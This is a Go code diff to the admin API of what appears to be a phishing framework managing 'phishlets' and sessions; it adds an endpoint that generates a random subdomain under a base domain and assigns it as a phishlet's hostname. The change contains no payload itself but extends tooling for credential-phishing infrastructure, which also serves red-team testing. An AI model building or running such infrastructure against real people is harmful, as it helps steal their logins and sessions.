@@ -237,6 +237,7 @@ func (api *AdminAPI) Start(bindAddr string, port int) error {
 	apiRouter.HandleFunc("/phishlets/{name}/hide", api.handleHidePhishlet).Methods("POST")
 	apiRouter.HandleFunc("/phishlets/{name}/unhide", api.handleUnhidePhishlet).Methods("POST")
 	apiRouter.HandleFunc("/phishlets/{name}/hostname", api.handleSetPhishletHostname).Methods("POST")
+	apiRouter.HandleFunc("/phishlets/{name}/hostname/generate", api.handleGeneratePhishletHostname).Methods("POST")
 	apiRouter.HandleFunc("/phishlets/{name}/hosts", api.handleGetPhishletHosts).Methods("GET")
 
 	// Sessions endpoints
@@ -810,6 +811,38 @@ func (api *AdminAPI) handleSetPhishletHostname(w http.ResponseWriter, r *http.Re
 	}
 
 	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Hostname updated"})
+}
+
+func (api *AdminAPI) handleGeneratePhishletHostname(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	name := vars["name"]
+
+	// Check if base domain is configured
+	baseDomain := api.cfg.GetBaseDomain()
+	if baseDomain == "" {
+		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Base domain not configured. Set domain in General Settings first."})
+		return
+	}
+
+	// Generate random subdomain (8 characters)
+	randBytes := make([]byte, 4)
+	rand.Read(randBytes)
+	randomSubdomain := hex.EncodeToString(randBytes)
+	
+	// Create full hostname
+	hostname := randomSubdomain + "." + baseDomain
+
+	// Set the hostname
+	if !api.cfg.SetSiteHostname(name, hostname) {
+		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Failed to set hostname"})
+		return
+	}
+
+	api.jsonResponse(w, http.StatusOK, APIResponse{
+		Success: true, 
+		Message: "Hostname generated",
+		Data: map[string]string{"hostname": hostname},
+	})
 }
 
 func (api *AdminAPI) handleGetPhishletHosts(w http.ResponseWriter, r *http.Request) {
